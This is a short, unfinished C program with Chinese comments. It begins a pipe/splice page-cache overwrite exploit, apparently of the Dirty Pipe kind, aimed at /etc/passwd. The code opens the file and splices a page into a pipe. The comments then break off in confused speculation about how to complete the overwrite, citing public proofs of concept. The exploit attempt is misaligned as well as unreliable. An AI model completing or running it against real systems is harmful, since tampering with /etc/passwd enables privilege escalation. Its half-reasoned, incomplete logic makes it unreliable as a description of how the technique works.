#include <fcntl.h>
#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>

int main() {
    // 打开目标文件（只读）
    int fd = open("/etc/passwd", O_RDONLY);
    if (fd < 0) {
        perror("open");
        return 1;
    }

    // 创建pipe
    int p[2];
    if (pipe(p) == -1) {
        perror("pipe");
        return 1;
    }

    // 使用splice将文件内容移动到pipe的写端
    // splice(fd, NULL, p[1], NULL, 1, 0) 移动1字节
    // 实际需要移动多个页面，但为了简化，只移动一个页面大小
    off_t offset = 0;
    ssize_t n = splice(fd, &offset, p[1], NULL, 4096, 0);
    if (n <= 0) {
        perror("splice");
        return 1;
    }

    // 现在pipe的读端包含文件页缓存
    // 关闭写端，然后从读端读取并修改？不，我们需要通过写端写入
    // 实际上，漏洞利用需要先通过splice将文件页面映射到pipe，然后通过write向pipe写端写入数据，覆盖页面
    // 但这里pipe的写端已经关闭？重新打开一个写端？
    // 标准POC：先创建pipe，然后splice到写端，然后关闭写端，再打开一个新的写端？
    // 简化：使用两个pipe，或者直接使用socket？
    // 参考公开POC：使用两个pipe，一个用于splice，另一个用于写入
